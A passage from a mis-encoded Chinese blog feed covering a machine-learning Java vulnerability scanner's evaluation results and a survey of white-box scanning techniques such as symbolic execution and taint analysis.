src="/whitebox-æ¯•è®¾åŸºäºæœºå™¨å­¦ä¹ çš„Javaæ¼æ´æ‰«æç³»ç»Ÿ/image-20200528173454324.png" alt="image-20200528173454324"></p><p>ç»“æœå¦‚å›¾ 4 æ‰€ç¤ºã€‚å¯ä»¥çœ‹å‡ºï¼Œä¸ºäº†ä¸å‘ç”Ÿæ¼æŠ¥ï¼ŒFind Security Bugs äº§ç”Ÿéå¸¸é«˜çš„è¯¯æŠ¥ç‡ï¼ˆè¯¯æŠ¥ç‡ä¸º1-65.09%=34.91%ï¼‰ä»è€Œå¯¼è‡´å‡†ç¡®ç‡å’Œ F1 å€¼æ°´å¹³ä¹Ÿè¾ƒä½ï¼Œä¸å‡†ç¡®çš„æ¼æ´æŠ¥å‘Šä¸ä»…ä¼šç»™å®‰å…¨å·¥ç¨‹å¸ˆé€ æˆå·¨å¤§å‹åŠ›ï¼Œæ›´å¯èƒ½é€ æˆé¡¹ç›®å¼€å‘è¿›åº¦è¢«é˜»å¡ï¼Œè€Œæœ¬ç³»ç»Ÿç»“åˆæ±¡ç‚¹åˆ†æå’Œæœºå™¨å­¦ä¹ çš„ä¼˜åŠ¿ï¼Œä»…ç‰ºç‰² 11.35% çš„å¬å›ç‡ï¼Œå°†ç²¾ç¡®ç‡æé«˜åˆ° 90% ä»¥ä¸Šï¼Œå³å¹³å‡ç³»ç»Ÿä¸­æŠ¥å‘Šçš„ 10 ä¸ªæ¼æ´ä¸­ï¼Œåªæœ‰ä¸€ä¾‹å¯èƒ½ä¸ºè¯¯æŠ¥ã€‚åœ¨å‡†ç¡®ç‡å’Œ F1 æŒ‡æ ‡ä¸Šä¹Ÿè¿œé«˜äº Find Security Bugsï¼Œè¿™è¯´æ˜ç‰ºç‰²å¬å›ç‡å…·æœ‰è¾ƒé«˜çš„æ”¶ç›Šæ¯”ã€‚</p><p>ç»¼ä¸Šï¼Œç›¸è¾ƒäºä¼ ç»Ÿæ±¡ç‚¹åˆ†æç±»æ‰«æå™¨ï¼Œæœ¬ç³»ç»Ÿèƒ½æ›´å‡†ç¡®åœ°å‘ç°æ¼æ´ï¼Œå¹¶ä¸”ä»¥è¾ƒå°çš„ä»£ä»·æå‡å‡†ç¡®æ€§ã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æœ¬æ–‡ä»‹ç»äº†ä¸€æ¬¾åŸºäºæœºå™¨å­¦ä¹ çš„Javaé™æ€æ¼æ´æ‰«æç³»ç»Ÿï¼ŒåŸºäºå­¦æœ¯ç•Œå‰æ²¿å·¥ä½œï¼Œç›¸å¯¹äºä¼ ç»Ÿæ‰«æå·¥å…·æœ¬ç³»ç»Ÿèƒ½æä¾›æ›´å‡†ç¡®çš„æ‰«æç»“æœï¼ŒåŒæ—¶ç³»ç»Ÿè§£å†³äº†å­¦æœ¯å·¥å…·åªèƒ½åº”å¯¹å°è§„æ¨¡ç¨‹åºçš„é—®é¢˜ï¼Œä½¿å…¶å¯ç”¨äºå®é™…ç”Ÿäº§ç¯å¢ƒã€‚åœ¨æœªæ¥å·¥ä½œä¸­ï¼Œæˆ‘ä»¬å°†ä¼šè¦†ç›–æ›´å¤šæ¼æ´ç±»å‹ã€æ‰©å……å­¦ä¹ æ•°æ®å¹¶å¯¹ç‰¹å®šæ¼æ´ç‹¬ç«‹è®­ç»ƒæ¨¡å‹ï¼Œä½¿æ‰«ææŠ¥å‘Šæ›´åŠ å‡†ç¡®ã€‚</p><h1 id="ç›¸å…³é“¾æ¥"><a href="#ç›¸å…³é“¾æ¥" class="headerlink" title="ç›¸å…³é“¾æ¥"></a>ç›¸å…³é“¾æ¥</h1><ol><li><p>Li Z, Zou D, Xu S, et al. Vuldeepecker: A deep learning-based system for vulnerability detection[J]. // Proceedings of the 2018 Network and Distributed System Security Symposium </p></li><li><p>Koc U, Saadatpanah P, Foster J S, et al. Learning a classifier for false positive error reports emitted by static code analysis tools[C]//Proceedings of the 1st ACM SIGPLAN International Workshop on Machine Learning and Programming Languages. 2017: 35-42.</p></li><li><p>Koc U, Wei S, Foster J S, et al. An Empirical Assessment of Machine Learning Approaches for Triaging Reports of a Java Static Analysis Tool[C]//Proceedings of the 12th IEEE Conference on Software Testing, Validation and Verification (ICST). IEEE, 2019: 288-299.</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;æœ¬æ–‡é¦–æ¬¡å‘è¡¨åœ¨&lt;a href=&quot;https://www.toutiao.com/i6826913540683596300/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;æ…•æµ‹å¤´æ¡å…¬ä¼—å·&lt;/a&gt;ï¼Œè¿™é‡Œåªä½œå½’æ¡£ç”¨&lt;/strong&gt;&lt;/p&gt;&lt;h1 id=&quot;èƒŒæ™¯æ„ä¹‰&quot;&gt;&lt;a href=&quot;#èƒŒæ™¯æ„ä¹‰&quot; class=&quot;headerlink&quot; title=&quot;èƒŒæ™¯æ„ä¹‰&quot;&gt;&lt;/a&gt;èƒŒæ™¯æ„ä¹‰&lt;/h1&gt;&lt;p&gt;éšç€äººä»¬å¯¹è½¯ä»¶å®‰å…¨çš„ä¸æ–­é‡è§†ï¼Œé™æ€å®‰å…¨æ‰«æç³»ç»Ÿè¢«éƒ¨ç½²äºå¼€å‘æµç¨‹ã€‚ç›¸å¯¹äºå…¶ä»–ä¼ ç»Ÿåˆ†ææ–¹æ³•ï¼Œæ±¡ç‚¹åˆ†ææŠ€æœ¯ç”±äºå…·æœ‰è¾ƒé«˜çš„å¯è§£é‡Šæ€§å’Œå‡†ç¡®æ€§ï¼Œç›®å‰ä½œä¸ºæŒ–æ˜ Web æ¼æ´çš„å¸¸ç”¨æŠ€æœ¯ï¼Œå¹¿æ³›åº”ç”¨äºå¼€æºå’Œå•†ç”¨æ‰«æå™¨ä¸­ã€‚&lt;/p&gt;&lt;p&gt;ç„¶è€Œï¼Œæ±¡ç‚¹åˆ†ææ–¹æ³•å­˜åœ¨ç§ç§ä¸è¶³ã€‚é¦–å…ˆï¼Œæ±¡ç‚¹åˆ†ææ— æ³•å¤„ç†å®¹å™¨ç±»å‹ï¼Œé™æ€æ±¡ç‚¹åˆ†æåªèƒ½å°†å®¹å™¨å˜é‡ï¼ˆå¦‚Mapã€Listå˜é‡ï¼‰çš„ä¼ æ’­è§„åˆ™è®¾ä¸ºä¼ æ’­/ä¸ä¼ æ’­æ±¡ç‚¹ï¼Œé€ æˆè¿‡æ±¡æŸ“/æ¬ æ±¡æŸ“ï¼›å…¶æ¬¡ï¼Œæ±¡ç‚¹åˆ†ææ— æ³•å¤„ç†æ§åˆ¶æµï¼Œæ±¡ç‚¹åˆ†æå¹¶ä¸èƒ½è¯†åˆ«ç”¨äºæ£€æŸ¥æ•°æ®æ˜¯å¦åˆæ³•çš„åˆ†æ”¯è¯­å¥ï¼Œå¯¼è‡´è¯¯æŠ¥ï¼›æœ€åï¼Œæ±¡ç‚¹åˆ†ææ— æ³•å¤„ç†ç‰¹æ®Šçš„ä¼ æ’­æ¡ä»¶ï¼Œå¦‚SSRFæ¼æ´è¦æ±‚æ”»å‡»è€…èƒ½æ“çºµåŸŸåï¼Œè‹¥æ±¡ç‚¹æ‹¼æ¥åœ¨URLå‚æ•°éƒ¨åˆ†ï¼Œåˆ™ä»£ç ä¸å­˜åœ¨æ¼æ´ï¼Œè€Œæ±¡ç‚¹åˆ†æä»ä¼šæŠ¥å‘Šæ¼æ´ã€‚ä¸ºè§£å†³è¿™äº›é—®é¢˜ï¼Œç›®å‰å®‰å…¨å·¥ç¨‹å¸ˆåªæœ‰æ‰‹åŠ¨è®¾è®¡ç²¾å·§çš„è§„åˆ™ï¼Œå¯å³ä½¿è¿™æ ·ä»ä¼šäº§ç”Ÿå¤§é‡è¯¯æŠ¥ç”šè‡³æ¼æŠ¥ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="æºç å®‰å…¨" scheme="http://anemone.top/categories/%E6%BA%90%E7%A0%81%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="æœºå™¨å­¦ä¹ " scheme="http://anemone.top/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="ç™½ç›’æ‰«æ" scheme="http://anemone.top/tags/%E7%99%BD%E7%9B%92%E6%89%AB%E6%8F%8F/"/>
    
  </entry>
  
  <entry>
    <title>ç™½ç›’æ‰«ææŠ€æœ¯ç»¼è¿°</title>
    <link href="http://anemone.top/whitebox-%E7%99%BD%E7%9B%92%E6%89%AB%E6%8F%8F%E6%8A%80%E6%9C%AF%E7%BB%BC%E8%BF%B0/"/>
    <id>http://anemone.top/whitebox-ç™½ç›’æ‰«ææŠ€æœ¯ç»¼è¿°/</id>
    <published>2020-05-28T11:27:37.000Z</published>
    <updated>2020-05-31T10:02:42.114Z</updated>
    
    <content type="html"><![CDATA[<p>å†™æ¯•è®¾è°ƒæŸ¥èƒŒæ™¯çŸ¥è¯†æ—¶åšçš„ï¼Œåœ¨<a href="https://www.t00ls.net/thread-56572-1-1.html" target="_blank" rel="noopener">t00ls</a>å’Œ<a href="https://forum.90sec.com/t/topic/1087" target="_blank" rel="noopener">90sec</a>å‘è¿‡å¸–å­ï¼Œè¿™é‡Œåšå½’æ¡£ç”¨ã€‚</p><h1 id="è¯æ³•åˆ†ææŠ€æœ¯"><a href="#è¯æ³•åˆ†ææŠ€æœ¯" class="headerlink" title="è¯æ³•åˆ†ææŠ€æœ¯"></a>è¯æ³•åˆ†ææŠ€æœ¯</h1><p>è¯æ³•åˆ†ææŠ€æœ¯æ˜¯æœ€ç®€å•çš„ä¸€ç±»æ¼æ´æŒ–æ˜æŠ€æœ¯ï¼Œå…¶ä¸»è¦æ€æƒ³æ˜¯å°†ä»£ç æ–‡æœ¬ä¸å½’çº³å¥½çš„ç¼ºé™·æ¨¡å¼è¿›è¡ŒåŒ¹é…ï¼Œä»¥æ­¤å‘ç°æ¼æ´ã€‚ç”±äºå…¶ä¸æ·±å…¥åˆ†æç¨‹åºç»“æ„å’Œè¯­ä¹‰ï¼Œå¾€å¾€åªèƒ½æŒ–æ˜è¾ƒä¸ºç®€å•çš„ä¸€ç±»æ¼æ´ï¼Œå¹¶ä¸”å­˜åœ¨ç›¸å½“é«˜çš„è¯¯æŠ¥ç‡ï¼Œåœ¨å®é™…åœºæ™¯ä¸‹åº”ç”¨è¾ƒå°‘ï¼Œä½†ç”±äºå…¶æ€æƒ³ç®€å•ï¼Œé€‚ç”¨æ€§å¾ˆå¹¿ï¼Œç›®å‰ä¹Ÿè¿˜å­˜åœ¨ç±»ä¼¼å·¥å…·ï¼Œå¦‚ï¼š<a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF" target="_blank" rel="noopener">MobSF</a>ï¼Œ<a href="https://github.com/WhaleShark-Team/cobra" target="_blank" rel="noopener">Cobra</a>ã€‚</p><a id="more"></a><h1 id="å½¢å¼åŒ–æ–¹æ³•åˆ†ææŠ€æœ¯"><a href="#å½¢å¼åŒ–æ–¹æ³•åˆ†ææŠ€æœ¯" class="headerlink" title="å½¢å¼åŒ–æ–¹æ³•åˆ†ææŠ€æœ¯"></a>å½¢å¼åŒ–æ–¹æ³•åˆ†ææŠ€æœ¯</h1><p>å½¢å¼åŒ–æ–¹æ³•åˆ†æä¸»è¦æ€æƒ³æ˜¯å°†è½¯ä»¶ä»£ç æ€§è´¨è¿›è¡Œå½¢å¼åŒ–æè¿°ï¼Œå†åˆ¤æ–­è¯¥æè¿°æ˜¯å¦æ»¡è¶³æ¼æ´ç‰¹å¾çš„ä¸€ç±»åˆ†ææ–¹æ³•[1]ï¼Œå…¶ä¸­å®šç†è¯æ˜æŠ€æœ¯æ˜¯å½¢å¼åŒ–ä»£ç åˆ†ææŠ€æœ¯çš„ä¸»è¦ä»£è¡¨ã€‚</p><p>å®šç†è¯æ˜æŠ€æœ¯å°†æ¼æ´å­˜åœ¨ï¼ˆæˆ–ä¸å­˜åœ¨ï¼‰å®šä¹‰ä¸ºä¸€å®šç†ï¼Œå†å°†æºç¨‹åºä»£ç ç‰¹å¾è½¬åŒ–ä¸ºæ•°å­¦è¡¨è¾¾å½¢å¼ï¼Œæœ€åå¯¹æ•°å­¦è¡¨è¾¾è¿›è¡Œé€»è¾‘æ¨ç†ï¼Œè‹¥å®šç†å­˜åœ¨æ€§å¾—ä»¥è¯æ˜ï¼Œåˆ™æ¼æ´å­˜åœ¨ï¼ˆæˆ–ä¸å­˜åœ¨ï¼‰ï¼Œå³æ¼æ´æŒ–æ˜è¿‡ç¨‹ç±»ä¼¼äºæ•°å­¦ä¸Šçš„å®šç†è¯æ˜è¿‡ç¨‹ã€‚ä¸»è¦ä»£è¡¨æ€§å·¥å…·æœ‰ <a href="https://fbinfer.com/" target="_blank" rel="noopener">infer</a>ã€ ESC/Java[2] å’Œ saturn[3]ã€‚</p><p>è¯¥æŠ€æœ¯ä½œä¸ºä¸€ç§ä½¿ç”¨ä¸¥æ ¼æ•°ç†é€»è¾‘æ¨ç†ä½œä¸ºæ£€æµ‹æ‰‹æ®µçš„æŠ€æœ¯ï¼Œè¯¯æŠ¥ç‡è¾ƒä½ï¼Œä½†ç”±äºå…¶éœ€è¦é’ˆå¯¹ç‰¹å®šæ¼æ´æ„å»ºæ•°å­¦æ¡ä»¶ï¼Œéœ€è¦å¤§é‡äººå·¥å‚ä¸ï¼Œæœ‰çš„æ¼æ´ç”šè‡³éš¾ä»¥ç”¨æ•°å­¦ç»“æ„è¡¨è¾¾ï¼Œç›®å‰åªé€‚ç”¨äºæ­»å¾ªç¯ã€èµ„æºæ³„éœ²å’Œç©ºæŒ‡é’ˆç­‰é—®é¢˜ï¼Œå¯¹æ–°æ¼æ´çš„æ‰©å±•æ€§ä¸é«˜ï¼ŒåŒæ—¶ï¼Œå¦‚ä½•å°†å¤§è§„æ¨¡ç¨‹åºåº”ç”¨äºå½¢å¼åŒ–æ–¹æ³•åˆ†æä¹Ÿæˆä¸ºå·¥ä¸šç•ŒäºŸå¾…è§£å†³çš„é—®é¢˜ã€‚ </p><p>å¯¹äºå½¢å¼åŒ–åˆ†ææŠ€æœ¯æœ¬äººä¹Ÿä¸æ˜¯å¾ˆäº†è§£ï¼Œæƒ³è¦è¿›ä¸€æ­¥äº†è§£çš„å»ºè®®çœ‹ä¸‹è®ºæ–‡[1]å’Œ<a href="https://github.com/leanprover/lean2" target="_blank" rel="noopener">lean2</a>ã€‚</p><h1 id="ç¬¦å·æ‰§è¡ŒæŠ€æœ¯"><a href="#ç¬¦å·æ‰§è¡ŒæŠ€æœ¯" class="headerlink" title="ç¬¦å·æ‰§è¡ŒæŠ€æœ¯"></a>ç¬¦å·æ‰§è¡ŒæŠ€æœ¯</h1><p>ç¬¦å·æ‰§è¡ŒæŠ€æœ¯æ˜¯ä¸€ç§å°†ç¨‹åºæ‰§è¡Œå¯è¾¾æ€§é—®é¢˜è½¬åŒ–ä¸ºçº¦æŸæ±‚è§£é—®é¢˜ï¼Œå¹¶ä»¥æ­¤è¿›è¡Œæ¼æ´æŒ–æ˜çš„æŠ€æœ¯[4]ï¼Œä»£è¡¨æ€§å·¥å…·æœ‰<a href="http://angr.io/" target="_blank" rel="noopener">angr</a>ï¼ŒDART[5], CUTE[6], EXE[7]å’ŒKLEE[8]ã€‚</p><p>å…·ä½“æ¥è¯´ï¼Œç¬¦å·æ‰§è¡ŒåŒ…å«ä¸€ä¸ªç¬¦å·çŠ¶æ€è¡¨$\sigma$å’Œä¸€ä¸ªç¬¦å·è·¯å¾„çº¦æŸ $PC$ ï¼Œå¼€å§‹æ—¶ï¼Œ $\sigma=\varnothing, PC=true$ ï¼Œæ¯è¯»å–ä¸€æ¡è¯­å¥ï¼Œå°±å°†å˜é‡æŠ½è±¡ä¸ºçº¦æŸæ±‚è§£ä¸­çš„å˜é‡ã€å¸¸é‡æˆ–ä»–ä»¬çš„è¡¨è¾¾å¼æ”¾å…¥ $\sigma$ ä¸­ï¼Œç‰¹åˆ«çš„ï¼Œå½“é‡åˆ°æ¡ä»¶åˆ¤æ–­ $if(e)$ æ—¶ï¼Œå°†ifåˆ†æ”¯çš„ $PC$ æ›´æ–°ä¸º $PC \wedge \sigma(e)$ ï¼Œå°†elseåˆ†æ”¯çš„ $PCâ€™$ æ›´æ–°ä¸º $PC\wedge \neg\sigma(e)$ ï¼Œéšåä½¿ç”¨çº¦æŸæ±‚è§£å™¨æ±‚è§£ $PC$ å’Œ $PCâ€™$ ï¼Œå¦‚æœçº¦æŸä¸æ»¡è¶³ï¼Œåˆ™åœæ­¢å¯¹è¯¥åˆ†æ”¯çš„è§£æï¼ˆå› ä¸ºè¯¥åˆ†æ”¯ä¸å¯è¾¾ï¼‰ã€‚å½“ç¬¦å·æ‰§è¡Œé‡åˆ°ç¨‹åºå´©æºƒã€é¢„å…ˆå®šä¹‰çš„æ¼æ´è¯­å¥ã€æˆ–æ˜¯ç¨‹åºæ­£å¸¸é€€å‡ºæ—¶ï¼Œæ•´ä¸ªåˆ†æåœæ­¢ï¼ŒåŒæ—¶å¯ä»¥è®¡ç®—å¯ä»¥åˆ°è¾¾åœæ­¢ç‚¹çš„è¾“å…¥ã€‚</p><p>ç¬¦å·æ‰§è¡Œå¯ä»¥åˆ†æç¨‹åºä¸­çš„æ§åˆ¶æµã€è¦†ç›–æ›´å¤šä»£ç ï¼ŒåŒæ—¶ä¹Ÿæœ‰æ•ˆé™ä½äº†è¯¯æŠ¥ç‡ï¼Œä½†ä¼ ç»Ÿç¬¦å·æ‰§è¡Œä¸¥é‡ä¾èµ–äºçº¦æŸæ±‚è§£å™¨çš„èƒ½åŠ›ï¼Œä¾‹å¦‚ï¼Œè‹¥çº¦æŸæ±‚è§£å™¨ä¸èƒ½å¤„ç†éçº¿æ€§è®¡ç®—ï¼Œæˆ–æ˜¯æ•´ä¸ªç¨‹åºä¸­å­˜åœ¨æ— æ³•åˆ†æçš„ç¬¬ä¸‰æ–¹åº“ï¼Œé‚£ä¹ˆæ•´ä¸ªåˆ†æå°†æ— æ³•ç»§ç»­ã€‚ä¸ºè§£å†³è¿™äº›é—®é¢˜ï¼Œç ”ç©¶è€…ä»¬æå‡ºäº†åŠ¨æ€ç¬¦å·æ‰§è¡Œçš„æƒ³æ³•[5,6,7,8]ï¼Œä½†å…¶åœ¨å®é™…åº”ç”¨ä¸­ä»ä¸æ˜¯å¾ˆå¹¿æ³›ï¼Œä¸»è¦åŸå› åœ¨äºå…¶éœ€è¦å¤§é‡è®¡ç®—èµ„æºï¼Œç”šè‡³åœ¨å¤„ç†å¤§è§„æ¨¡ç¨‹åºæ—¶ï¼Œå‡ºç°çš„è·¯å¾„çˆ†ç‚¸é—®é¢˜ä¼šå¯¼è‡´çº¦æŸæ±‚è§£æ— æ³•äº§ç”Ÿç»“æœã€‚</p><p>ç¬¦å·æ‰§è¡ŒæŠ€æœ¯æ˜¯ç›®å‰å·¥ä¸šç•Œå’Œä¼ä¸šç•Œéƒ½åœ¨ç ”ç©¶çš„çƒ­é—¨é¢†åŸŸï¼Œè¿™é‡Œæ¨èè‹±è¯­å¥½çš„æœ‹å‹çœ‹ä¸‹<a href="https://www.youtube.com/watch?v=mffhPgsl8Ws" target="_blank" rel="noopener">æ­¤è§†é¢‘</a>å’Œç¬¦å·æ‰§è¡Œçš„ç»å…¸æ–‡ç« â€œSymbolic Execution for Software Testing: Three Decades Laterâ€[4]ï¼Œè‹±è¯­ä¸å¥½çš„æœ‹å‹æ¨èä¸€ä¸‹è¿™<a href="https://wcventure.github.io/" target="_blank" rel="noopener">wcventure</a>å¤§ä½¬æ€»ç»“çš„<a href="https://blog.csdn.net/wcventure" target="_blank" rel="noopener">è¿™ç¯‡æ–‡ç« </a>ã€‚</p><h1 id="æ•°æ®æµå’Œæ§åˆ¶æµåˆ†ææŠ€æœ¯"><a href="#æ•°æ®æµå’Œæ§åˆ¶æµåˆ†ææŠ€æœ¯" class="headerlink" title="æ•°æ®æµå’Œæ§åˆ¶æµåˆ†ææŠ€æœ¯"></a>æ•°æ®æµå’Œæ§åˆ¶æµåˆ†ææŠ€æœ¯</h1><p>æ•°æ®æµåˆ†ææ˜¯ä¸€ç§æŒ‰ç¨‹åºæ‰§è¡Œè·¯å¾„æ¨¡æ‹Ÿæ•°æ®æµåŠ¨çš„ä¸€ç§åˆ†ææŠ€æœ¯ï¼Œå…¶åŸæœ¬ç”¨äºè¿›è¡Œç¨‹åºä¼˜åŒ–[9]ï¼Œå®‰å…¨ç ”ç©¶è€…ä»¬å‘ç°åå°†å…¶è¿ç”¨äºæ¼æ´æŒ–æ˜ä¸­ï¼Œå¦‚ä»Šè¯¥æŠ€æœ¯åœ¨ç™½ç›’ï¼Œç°ç›’å’Œé»‘ç›’æµ‹è¯•éƒ½æœ‰åº”ç”¨[10]ã€‚</p><p>åœ¨æ•°æ®æµåˆ†æè¿‡ç¨‹ä¸­ï¼Œå­˜åœ¨<strong>è¿‡ç¨‹å†…åˆ†æ</strong>å’Œ<strong>è¿‡ç¨‹é—´åˆ†æ</strong>ï¼Œè¿‡ç¨‹å†…åˆ†æä¸»è¦å¯¹å‡½æ•°å†…åˆ†æï¼Œè€Œè¿‡ç¨‹é—´åˆ†æä¸»è¦å¤„ç†è·¨å‡½æ•°åˆ†æã€‚</p><ul><li><p>å¯¹äºè¿‡ç¨‹å†…åˆ†æï¼Œæ ¹æ®å…¶å¯¹ç¨‹åºè·¯å¾„çš„åˆ†æç²¾åº¦ï¼Œå¯åˆ†ä¸ºæµä¸æ•æ„Ÿåˆ†æï¼Œæµæ•æ„Ÿåˆ†æå’Œè·¯å¾„æ•æ„Ÿåˆ†æã€‚æµä¸æ•æ„Ÿçš„æ•°æ®æµåˆ†æåªæ˜¯æŒ‰ä»£ç è¡Œå·ä»ä¸Šè€Œä¸‹è¿›è¡Œåˆ†æï¼›æµæ•æ„Ÿåˆ†æä¼šé¦–å…ˆäº§ç”Ÿç¨‹åºæ§åˆ¶æµå›¾ï¼ˆCFG, Control Flow Graphï¼‰ï¼Œå†æŒ‰ç…§CFGçš„æ‹“æ‰‘æ’åºæ­£å‘æˆ–é€†å‘åˆ†æï¼›è·¯å¾„æ•æ„Ÿä¿¡æ¯ä¸ä»…è€ƒè™‘åˆ°è¯­å¥å…ˆåé¡ºåºï¼Œè¿˜ä¼šè€ƒè™‘è¯­å¥å¯è¾¾æ€§ï¼Œå³ä¼šæ²¿å®é™…å¯æ‰§è¡Œåˆ°è·¯å¾„è¿›è¡Œåˆ†æã€‚</p></li><li><p>è¿‡ç¨‹é—´åˆ†æï¼Œé¦–å…ˆæ„é€ ç¨‹åºçš„è°ƒç”¨å›¾ï¼ˆCG, Call Graphï¼‰ï¼Œæ¥ç€éå†å›¾ä¸­å‡½æ•°è¿›è¡Œè¿‡ç¨‹å†…åˆ†æï¼Œå½“é‡åˆ°å…¶ä»–å‡½æ•°æ—¶ï¼Œè‹¥å·²åˆ†æè¿‡ï¼Œåˆ™ç›´æ¥ä½¿ç”¨åˆ†æç»“æœå‘ä¸‹åˆ†æï¼Œè‹¥æœªåˆ†æè¿‡ï¼Œåˆ™è·Ÿè¿›è¯¥å‡½æ•°ï¼Œå†æ¬¡è¿›è¡Œè¿‡ç¨‹å†…åˆ†æï¼Œå¹¶ä¸”å°†åˆ†æç»“æœä¿å­˜ã€‚</p></li></ul><p>æ•°æ®æµåˆ†æèƒ½å¤Ÿä¸€å®šç¨‹åº¦ä¸Šç†è§£ç¨‹åºè¯­ä¹‰ï¼Œæ˜¯ä¸€ç§æ¯”è¯æ³•åˆ†ææŠ€æœ¯æ›´ä¸ºç²¾ç¡®çš„ä¸€ç±»åˆ†ææŠ€æœ¯ï¼Œå…¶å…³é”®åœ¨äºå‡†ç¡®è®¡ç®—ç¨‹åºçš„æ•°æ®æµã€‚</p><h1 id="æ±¡ç‚¹åˆ†ææŠ€æœ¯"><a href="#æ±¡ç‚¹åˆ†ææŠ€æœ¯" class="headerlink" title="æ±¡ç‚¹åˆ†ææŠ€æœ¯"></a>æ±¡ç‚¹åˆ†ææŠ€æœ¯</h1><p>æ±¡ç‚¹åˆ†æå±äºæ•°æ®æµåˆ†æçš„å˜ç§ï¼Œé€šè¿‡åˆ¤æ–­å…³é”®æ“ä½œçš„æ•°æ®ï¼ˆå¦‚è°ƒç”¨å±é™©å‡½æ•°çš„å‚æ•°ï¼‰æ˜¯å¦å¯è¢«ç”¨æˆ·æ“æ§ï¼Œæ¨æµ‹ç¨‹åºæ˜¯å¦å­˜åœ¨å®‰å…¨æ€§æ¼æ´ã€‚ç”±äºå…¶äº†è§£ç¨‹åºä¸Šä¸‹æ–‡ï¼Œå¹¶ä¸”æœ‰è¾ƒå¼ºçš„å¯è§£é‡Šæ€§â€”â€”å®‰å…¨å·¥ç¨‹å¸ˆå¯ä»¥é€šè¿‡è·Ÿè¸ªæ±¡ç‚¹ä¼ æ’­è¿‡ç¨‹åˆ¤æ–­æ˜¯å¦å­˜åœ¨å®‰å…¨é—®é¢˜ï¼Œå› æ­¤å…¶ä¹Ÿæˆä¸ºäº†æŒ–æ˜ Web æˆ– Android æ¼æ´è¾ƒä¸ºå¸¸ç”¨çš„æŠ€æœ¯ï¼Œä¹Ÿè¢«å¾ˆå¤šå¼€æºæˆ–å•†ç”¨ç™½ç›’æ‰«æå™¨ä½¿ç”¨ï¼Œå¦‚ï¼šPixy[11]ã€Find Security Bugsã€<a href="https://www.microfocus.com/en-us/solutions/application-security" target="_blank" rel="noopener">Fortify</a>å’Œ<a href="https://lgtm.com/" target="_blank" rel="noopener">LGTM</a>ã€‚</p><h2 id="ä¸‰è¦ç´ "><a href="#ä¸‰è¦ç´ " class="headerlink" title="ä¸‰è¦ç´ "></a>ä¸‰è¦ç´ </h2><p>æ±¡ç‚¹åˆ†æä¸»è¦æœ‰ä¸‰ä¸ªç»„æˆè¦ç´ ï¼šæ±¡ç‚¹ä¿¡æ¯äº§ç”Ÿç‚¹ï¼ˆsourceï¼‰ã€æ±¡ç‚¹ä¿¡æ¯æ±‡èšç‚¹ï¼ˆsinkï¼‰å’Œæ±¡ç‚¹ä¿¡æ¯æ¸…æ´ç‚¹ï¼ˆsanitizerï¼‰ï¼Œå®ƒä»¬é€šå¸¸éœ€è¦å¯Œæœ‰ç»éªŒçš„å®‰å…¨å·¥ç¨‹å¸ˆæ‰‹åŠ¨è®¾ç½®ã€‚</p><ul><li>äº§ç”Ÿç‚¹ï¼ˆsourceï¼‰ï¼šæ±¡ç‚¹äº§ç”Ÿç‚¹å¾€å¾€æ˜¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®ï¼Œæ¯”å¦‚Webåº”ç”¨ä¸­è¯»å–URLå‚æ•°çš„å‡½æ•°ï¼Œé¡¾åæ€ä¹‰ï¼Œè¿™äº›å‡½æ•°è°ƒç”¨åçš„è¿”å›å€¼è¢«æ ‡è®°ä¸ºæ±¡ç‚¹â€”â€”æ”»å‡»è€…å¯ä»¥æ“æ§çš„æ•°æ®ç‚¹ã€‚</li><li>æ±‡èšç‚¹ï¼ˆsinkï¼‰ï¼šæ£€æŸ¥ç‚¹æ˜¯ç¨‹åºçš„ä¸€äº›æ•æ„Ÿæ“ä½œï¼Œå¦‚è°ƒç”¨æ•°æ®åº“æŸ¥è¯¢è¯­å¥ï¼Œæˆ–æ˜¯å°†æ•°æ®è¿”å›åˆ°ç½‘é¡µï¼Œå¦‚æœè¿™äº›æ“ä½œçš„æ•°æ®æ˜¯æ±¡ç‚¹ï¼Œé‚£ä¹ˆæ„å‘³ç€æ“ä½œå¯è¢«æ”»å‡»è€…åˆ©ç”¨ï¼Œå³ç¨‹åºå­˜åœ¨æ¼æ´ã€‚</li><li>æ¸…æ´ç‚¹ï¼ˆsanitizerï¼‰ï¼šæ¸…æ´ç‚¹é€šå¸¸æ˜¯å¯¹æ±¡ç‚¹è¿›è¡Œæ¶ˆé™¤çš„ä¸€ç±»æ“ä½œï¼Œå¦‚SQLæ³¨å…¥ã€XSSä¸­çš„è¿‡æ»¤å‡½æ•°ã€‚æ¸…æ´ç‚¹æ˜¯æ±¡ç‚¹ä¼ æ’­å‡†ç¡®æ€§çš„é‡è¦ä¿è¯ï¼Œä¸èƒ½è¯†åˆ«æ¸…æ´ç‚¹å³ä¼šå¼•å‘æ±¡ç‚¹è¿‡æ±¡æŸ“é—®é¢˜ã€‚</li></ul><h2 id="åˆ†æè¿‡ç¨‹"><a href="#åˆ†æè¿‡ç¨‹" class="headerlink" title="åˆ†æè¿‡ç¨‹"></a>åˆ†æè¿‡ç¨‹</h2><p>æ±¡ç‚¹åˆ†æåˆ†ä¸ºé™æ€æ±¡ç‚¹åˆ†æå’ŒåŠ¨æ€æ±¡ç‚¹åˆ†æï¼Œä¸¤è€…åŒºåˆ«åœ¨äºé™æ€æ±¡ç‚¹åˆ†æåªä½¿ç”¨ç¨‹åºä»£ç æ¨¡æ‹Ÿæ±¡ç‚¹ä¼ æ’­è¿‡ç¨‹ï¼Œè€ŒåŠ¨æ€æ±¡ç‚¹ä¼ æ’­åˆ™é€šè¿‡ç¨‹åºçš„å®é™…è¿è¡Œè¿›è¡Œä¼ æ’­ï¼Œç”±äºæœ¬æ–‡å…³æ³¨äºç™½ç›’æµ‹è¯•æƒ…æ™¯ï¼Œæ•…åªä»‹ç»é™æ€æ±¡ç‚¹ä¼ æ’­æ–¹æ³•ï¼Œè€Œåœ¨ä¸‹ä¸€å­ç« èŠ‚ä¼šä»‹ç»åŠ¨æ€ä¼ æ’­çš„ä¼˜åŠ£åŠ¿ã€‚</p><p>åœ¨å®šä¹‰å¥½ä¸‰è¦ç´ 